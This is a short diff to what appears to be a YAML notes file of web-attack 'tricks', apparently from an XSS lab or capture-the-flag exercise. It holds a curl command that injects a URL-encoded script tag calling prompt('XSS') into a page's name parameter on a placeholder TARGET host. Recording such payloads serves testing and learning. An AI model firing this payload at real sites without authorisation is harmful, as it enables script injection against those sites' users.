@@ -37,4 +37,3 @@ tricks:
     how: "GET request to /page with name parameter"
     payload: |
       curl "http://TARGET/page?name=%3Cscript%3Eprompt(%27XSS%27)%3C/script%3E"
-
